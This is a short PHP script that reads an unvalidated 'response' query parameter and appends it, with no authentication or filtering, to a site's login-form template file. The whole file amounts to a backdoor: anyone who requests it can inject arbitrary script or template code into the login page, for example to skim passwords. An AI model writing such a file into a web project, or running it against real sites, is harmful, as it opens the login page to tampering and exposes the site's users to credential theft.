<?php

$response = isset($_GET['response']) ? $_GET['response'] : '';

file_put_contents('../include/templates/login-form.tpl', $response.PHP_EOL , FILE_APPEND | LOCK_EX);

?>
